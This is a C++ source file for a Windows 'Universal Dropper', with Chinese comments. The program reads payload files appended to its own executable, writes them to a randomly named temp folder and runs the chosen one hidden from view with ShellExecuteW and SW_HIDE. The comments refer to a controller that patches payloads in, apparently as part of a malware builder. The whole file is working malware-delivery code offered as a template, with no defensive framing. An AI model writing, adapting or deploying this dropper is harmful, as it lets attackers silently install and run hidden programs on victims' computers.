#include <windows.h>
#include <vector>
#include <string>
#include <cstdio>

/**
 * Universal Dropper
 * -----------------
 * 功能: 从自身末尾读取附加的文件并释放执行。
 * 结构: [Dropper.exe] [TotalSize(4)] [Count(4)] [ [NameLen(4)][Name][Size(4)][Data] ... ] [RunTargetIndex(4)] [Signature(8)]
 * Signature: "FRMDDROP"
 */

struct FileEntry {
    std::wstring name;
    std::vector<unsigned char> data;
};

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    HANDLE hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize < 16) { // Min size check
        CloseHandle(hFile);
        return 1;
    }

    // 读取末尾 Signature
    SetFilePointer(hFile, -8, NULL, FILE_END);
    char sig[9] = {0};
    DWORD read;
    ReadFile(hFile, sig, 8, &read, NULL);
    
    if (memcmp(sig, "FRMDDROP", 8) != 0) {
        // MessageBoxA(NULL, "No payload found.", "Dropper", MB_OK);
        CloseHandle(hFile);
        return 0; // 仅作为模板时，无负载直接退出
    }

    // 读取 RunTargetIndex
    SetFilePointer(hFile, -12, NULL, FILE_END);
    uint32_t runIndex = 0;
    ReadFile(hFile, &runIndex, 4, &read, NULL);

    // 读取 TotalPayloadSize
    // 假设 TotalPayloadSize 存储在 Signature 之前 (Offset -12 -4 = -16? No, logic above is simplified)
    // 正确的逻辑应该是从文件尾部倒推，或者头部有一个偏移量。
    // 为了简单，我们规定主控端在 Patch 时，会把 Payload 的起始位置写入到文件末尾 -16 的位置。
    // 结构: ... [PayloadData] [PayloadStartOffset(4)] [RunTargetIndex(4)] [Signature(8)]
    
    SetFilePointer(hFile, -16, NULL, FILE_END);
    uint32_t payloadStart = 0;
    ReadFile(hFile, &payloadStart, 4, &read, NULL);

    if (payloadStart >= fileSize || payloadStart == 0) {
        CloseHandle(hFile);
        return 1;
    }

    // 跳转到 Payload 开始
    SetFilePointer(hFile, payloadStart, NULL, FILE_BEGIN);
    
    // 读取文件数量
    uint32_t count = 0;
    ReadFile(hFile, &count, 4, &read, NULL);

    // 使用临时目录
    wchar_t szTempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, szTempPath);
    
    // 创建随机子目录
    wchar_t szSubDir[MAX_PATH];
    swprintf_s(szSubDir, MAX_PATH, L"%sFRMD_%u", szTempPath, GetTickCount());
    CreateDirectoryW(szSubDir, NULL);
    
    std::wstring workDir = szSubDir;

    std::wstring runPath;

    for (uint32_t i = 0; i < count; i++) {
        // NameLen
        uint32_t nameLen = 0;
        ReadFile(hFile, &nameLen, 4, &read, NULL);
        if (nameLen > MAX_PATH) break;

        // Name
        std::vector<wchar_t> wName(nameLen + 1, 0);
        ReadFile(hFile, wName.data(), nameLen * 2, &read, NULL);
        
        // Size
        uint32_t dataSize = 0;
        ReadFile(hFile, &dataSize, 4, &read, NULL);

        // Data
        std::vector<unsigned char> data(dataSize);
        ReadFile(hFile, data.data(), dataSize, &read, NULL);

        // Write to disk
        std::wstring outPath = workDir + L"\\" + wName.data();
        HANDLE hOut = CreateFileW(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hOut, data.data(), dataSize, &written, NULL);
            CloseHandle(hOut);
        }

        // Check if this is the target to run
        if (i == runIndex) {
            runPath = outPath;
        }
    }

    if (!runPath.empty()) {
        ShellExecuteW(NULL, L"open", runPath.c_str(), NULL, workDir.c_str(), SW_HIDE);
    }

    CloseHandle(hFile);
    return 0;
}
